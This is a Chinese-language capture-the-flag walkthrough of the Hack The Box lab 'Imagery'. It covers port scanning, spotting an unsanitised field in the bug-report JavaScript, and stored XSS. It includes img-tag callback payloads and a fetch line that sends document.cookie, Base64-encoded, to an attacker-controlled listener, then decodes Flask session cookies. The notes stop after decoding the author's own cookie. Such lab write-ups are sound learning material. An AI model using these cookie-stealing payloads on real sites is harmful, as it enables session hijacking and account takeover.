## Imagery
```
[★]$ nmap -sV -sC 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-27 00:27 CST
Nmap scan report for 10.129.242.164
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```
#### 在扫描的时候没有发现域名，打开网页8000端口可以找寻相关域名
```
[★]$ echo '10.129.242.164 imagery.htb' | sudo tee -a /etc/hosts
```
#### 注册登录后，点击地下的的Report Bug
#### burpsuite
### [1]
```
<img src="http://10.10.15.132:8000/XSS_NAME"></img>

<img src="http://10.10.15.132:8000/XSS_DESC"></img>
```
#### 使用nc侦听,使用8000端口，不使用$ python3 -m http.server 8000
```
[★]$ nc -lvnp 8000
listening on [any] 8000 ...

//需要输入如下，nc才能侦听到反弹
[★]$ curl http://10.129.242.164:8000/ -s | grep function

[★]$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.15.132] from (UNKNOWN) [10.129.242.164] 44538
GET /XSS_DESC HTTP/1.1
Host: 10.10.15.132:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
#### 发现信息函数 async function loadBugReports() { 
```
[★]$ curl http://10.129.242.164:8000/ -s | grep function
        function showMessage(message, type = 'info') {
        function showMessageOnce(message, type = 'info', uniqueId = '') {
        async function navigateTo(pageId) {
        async function checkAuthStatus(updateUI = true) {
        function updateFooterLinks() {
        function updateUIBasedOnAuth() {
        async function registerUser(event) {
        async function loginUser(event) {
        async function logoutUser() {
        async function loadGalleryImages() {
        function toggleAccordion(contentId) {
        function toggleImageMenu(event, imageId) {
        function closeAllImageMenus(event) {
        function showConfirmationModal(message, onConfirm, confirmText = 'Confirm', cancelText = 'Cancel', type = 'info') {
        function hideConfirmationModal() {
        function showDeleteConfirmation(imageId, imageType) {
        async function deleteImageConfirmed(imageId, deleteAllDerived) {
        function handleEditImage(imageId) {
        async function editImageDetails() {
        function hideEditModal() {
        function updateConversionFormatOptions(currentMimeType) {
        function handleConvertImage(imageId) {
        async function executeConversion() {
        function hideConversionModal() {
        function handleVisualTransformImage(imageId) {
        function drawCanvas() {
        function getMousePos(event) {
        function getCanvasToImageScale() {
        function isPointInHandle(x, y, handle) {
        function canvasMouseDown(e) {
        function canvasMouseMove(e) {
        function canvasMouseUp() {
        function updateCropInputs() {
        function updateVisualTransformParamsVisibility() {
        async function executeVisualTransform() {
        function hideVisualTransformModal() {
        async function handleMetadataDeletion(imageId) {
        function setUploadMode(mode) {
        async function uploadImage(event) {
        async function submitBugReport(event) {
        async function loadBugReports() { //这里
        function showDeleteBugReportConfirmation(reportId) {
        async function deleteBugReport(reportIdToDelete) {
        async function loadUsersForAdminPanelDisplay(users) {
        function handleDownloadUserLog(username) {
        function showDeleteUserConfirmation(username) {
        async function deleteUser(usernameToDelete) {
        async function loadAdminPanelContent() {
        function togglePasswordVisibility(passwordInputId) {
        async function populateImageGroupDropdown() {
        async function createNewGroup() {
        async function moveSelectedImagesToGroup() {
        function showManageGroupsModal() {
        function hideManageGroupsModal() {
```
#### Google搜索：0xdf 404 templates
https://0xdf.gitlab.io/cheatsheets/404
#### 本靶机的404：
```
Not Found

The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
```
#### 404对应为Flask是一个用Python编写的轻量级Web框架，它设计简洁，便于快速开发Web应用程序。
```
Flask
Flask is a Python web framework. The default 404 page looks like:
```
#### 在Fn12 -> Storage里有session
```
[★]$ pip3 install flask-unsign
[★]$ flask-unsign -d -c .eJxNjTEOgzAMRe_iuaragSUTHXuKyBAnWCIGxWaIEHeHDEUd33tf-jsE1nXG-g3goKP4imF4wwNYPyGzgIs4KzX2nFcquggaS_JGaptS-V_8nMdxXDaxuzUpmOn60IqFKvacMVGpz8kGOE7RtDFU.aaPpmw.Ews05hd6hyK5vDBa6ygehufOxKA
{'displayId': '5ef0fdb1', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'syareya@imagery.htb'}
```
#### flask-unsign是用来解析Flask应用的签名cookie的；-d可读;-c解析
#### 下载一个普通的 JPG 图片文件
```
[★]$ find /usr -name *.jpg
[★]$ cp /usr/share/caja/patterns/gnome.jpg .
```
#### 上传这个文件在Upload New Image ,发现图片的主要功能无法点击
```
Edit Details
Convert Format
Transform Image
Delete Metadata
Download //可以点击
Delete   //可以点击
```
#### 点击Download，验证图片的值是一样的
```
[★]$ md5sum 980738ad-3807-4995-9fad-08d290dcaf8d_gnome.jpg gnome.jpg
28aab0de5e17bbb78a027551d46ee984  980738ad-3807-4995-9fad-08d290dcaf8d_gnome.jpg
28aab0de5e17bbb78a027551d46ee984  gnome.jpg
```
#### 查看网站源代码,关键词loadBugReports，发现信息 ${report.details}
```
async function loadBugReports() {
            const bugReportsList = document.getElementById('bug-reports-list');
            const noBugReports = document.getElementById('no-bug-reports');

            if (!bugReportsList || !noBugReports) {
                console.error("Error: Admin panel bug report elements not found.");
                return;
            }

            bugReportsList.innerHTML = '';
            noBugReports.style.display = 'none';

            try {
                const response = await fetch(`${window.location.origin}/admin/bug_reports`); //这里指向admin
                const data = await response.json();

                if (data.success) {
                    if (data.bug_reports.length === 0) {
                        noBugReports.style.display = 'block';
                    } else {
                        data.bug_reports.forEach(report => {
                            const reportCard = document.createElement('div');
                            reportCard.className = 'bg-white p-6 rounded-xl shadow-md border-l-4 border-purple-500 flex justify-between items-center';
                            
                            reportCard.innerHTML = `
                                <div>
                                    <p class="text-sm text-gray-500 mb-2">Report ID: ${DOMPurify.sanitize(report.id)}</p>
                                    <p class="text-sm text-gray-500 mb-2">Submitted by: ${DOMPurify.sanitize(report.reporter)} (ID: ${DOMPurify.sanitize(report.reporterDisplayId)}) on ${new Date(report.timestamp).toLocaleString()}</p>
                                    <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
                                    <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Details:</h3>
                                    <div class="bg-gray-100 p-4 rounded-lg overflow-auto max-h-48 text-gray-700 break-words">
                                        ${report.details}  //这里
                                    </div>
                                </div>
                                <button onclick="showDeleteBugReportConfirmation('${DOMPurify.sanitize(report.id)}')" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-200 ml-4">
                                    Delete
                                </button>
                            `;
                            bugReportsList.appendChild(reportCard);
                        });
                    }
                } else {
                    showMessage(data.message, 'error');
                }
            } catch (error) {
                console.error('Error loading bug reports:', error);
                showMessage('Failed to load bug reports. Please try again later.', 'error');
            }
        }
```
#### 这是一个非常典型、而且危险的「存储型 XSS（Stored XSS）」漏洞点，而且触发对象是 admin
#### 关键事实：report.details 没有经过 DOMPurify.sanitize()
#### 但它被 直接拼进了 innerHTML，而其他字段（id / reporter / name）全部都被 sanitize 了
#### XSS 是 Cross-Site Scripting（跨站脚本攻击）
#### 另外一个信息await fetch(`${window.location.origin}/admin/bug_reports`); 
#### //fetch 是浏览器里的函数，用来：向服务器发 HTTP 请求，拿数据回来
#### 然后去浏览器的http:// 10.129.242.164:8000/admin/bug_reports
```	
message	"Access denied. Administrator privileges required."
success	false
```
#### 
```
[★]$ curl http://10.129.242.164:8000/ -s | grep fetch|awk -F\` '{print$2}'
${window.location.origin}/auth_status?_t=${new Date().getTime()}
${window.location.origin}/register
${window.location.origin}/login
${window.location.origin}/logout
${window.location.origin}/images
${window.location.origin}/delete_image
${window.location.origin}/edit_image_details
${window.location.origin}/convert_image
${window.location.origin}/apply_visual_transform
${window.location.origin}/delete_image_metadata
${window.location.origin}${endpoint}
${window.location.origin}/report_bug
${window.location.origin}/admin/bug_reports
${window.location.origin}/admin/delete_bug_report
${window.location.origin}/admin/delete_user
${window.location.origin}/admin/users
${window.location.origin}/get_image_collections
${window.location.origin}/create_image_collection
${window.location.origin}/move_images_to_collection
```
#### 浏览页搜索： https:// ippsec.rocks 搜索关键词：csrf //好像没结果
#### CSRF 是 Cross-Site Request Forgery（跨站请求伪造） 的缩写
```
这些接口有一个共同点：
👉 大量“会改数据的操作”
delete_user
delete_image
edit_image_details
move_images_to_collection
这类接口如果：
❌ 没有 CSRF Token
❌ 只靠 cookie 判断身份
那就满足了 CSRF 的利用前提。
```
### [2]
```
[★]$ nc -lvnp 8011
listening on [any] 8011 ...
```
#### 在浏览器上Fn12 的控制端console输入:
```
fetch("http://10.10.15.132:8011/?"+btoa(document.cookie))
Promise { <state>: "pending" }
```
#### 侦听收到
```
[★]$ nc -lvnp 8011
listening on [any] 8011 ...
connect to [10.10.15.132] from (UNKNOWN) [10.10.15.132] 46986
GET /?c2Vzc2lvbj0uZUp4TmpURU9nekFNUmVfaXVhcmFnU1VUSFh1S3lCQW5XQ0lHeFdhSUVIZUhERVVkMzN0Zi1qc0UxblhHLWczZ29LUDRpbUY0d3dOWVB5R3pnSXM0S3pYMm5GY3F1Z2dhU19KR2FwdFMtVl84bk1keFhEYXh1elVwbU9uNjBJcUZLdmFjTVZHcHo4a0dPRTdSdERGVS5hYVBwbXcuRXdzMDVoZDZoeUs1dkRCYTZ5Z2VodWZPeEtB HTTP/1.1
Host: 10.10.15.132:8011
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.242.164:8000/
Origin: http://10.129.242.164:8000
DNT: 1
Connection: keep-alive
Sec-GPC: 1
Priority: u=4
```
#### document.cookie 这是浏览器里的一个变量，表示：当前网站的 Cookie 内容
#### btoa(...) btoa 的作用是：把字符串做 Base64 编码
```
[★]$ echo c2Vzc2lvbj0uZUp4TmpURU9nekFNUmVfaXVhcmFnU1VUSFh1S3lCQW5XQ0lHeFdhSUVIZUhERVVkMzN0Zi1qc0UxblhHLWczZ29LUDRpbUY0d3dOWVB5R3pnSXM0S3pYMm5GY3F1Z2dhU19KR2FwdFMtVl84bk1keFhEYXh1elVwbU9uNjBJcUZLdmFjTVZHcHo4a0dPRTdSdERGVS5hYVBwbXcuRXdzMDVoZDZoeUs1dkRCYTZ5Z2VodWZPeEtB | base64 -d
session=.eJxNjTEOgzAMRe_iuaragSUTHXuKyBAnWCIGxWaIEHeHDEUd33tf-jsE1nXG-g3goKP4imF4wwNYPyGzgIs4KzX2nFcquggaS_JGaptS-V_8nMdxXDaxuzUpmOn60IqFKvacMVGpz8kGOE7RtDFU.aaPpmw.Ews05hd6hyK5vDBa6ygehufOxKA
```
#### 得到的是我们自己注册的用户信息
```
[★]$ flask-unsign -d -c .eJxNjTEOgzAMRe_iuaragSUTHXuKyBAnWCIGxWaIEHeHDEUd33tf-jsE1nXG-g3goKP4imF4wwNYPyGzgIs4KzX2nFcquggaS_JGaptS-V_8nMdxXDaxuzUpmOn60IqFKvacMVGpz8kGOE7RtDFU.aaPpmw.Ews05hd6hyK5vDBa6ygehufOxKA
{'displayId': '5ef0fdb1', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'syareya@imagery.htb'}
```
#### 
